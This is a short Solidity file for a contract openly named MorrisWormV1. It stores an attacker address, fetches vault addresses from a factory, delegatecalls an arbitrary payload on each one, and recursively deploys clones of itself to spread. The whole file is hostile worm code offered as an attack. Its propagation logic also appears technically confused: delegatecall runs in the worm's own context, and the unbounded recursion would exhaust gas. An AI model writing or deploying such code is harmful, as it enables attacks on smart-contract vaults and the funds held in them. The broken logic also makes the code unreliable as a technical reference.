// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IFactory {
    function getVaults() external view returns (address[] memory);
}

contract MorrisWormV1 {
    address public factory;
    address public attacker;

    constructor(address _factory, address _attacker) {
        factory = _factory;
        attacker = _attacker;
    }

    function spread(bytes calldata payload) external {
        address[] memory targets = IFactory(factory).getVaults();

        for (uint256 i = 0; i < targets.length; i++) {
            (bool success, ) = targets[i].delegatecall(payload);
            if (success) {
                // ⛓ Optionally re-deploy worm or mutate
                MorrisWormV1 clone = new MorrisWormV1(factory, attacker);
                clone.spread(payload); // 🪱 recursive propagation
            }
        }
    }

    receive() external payable {}
}
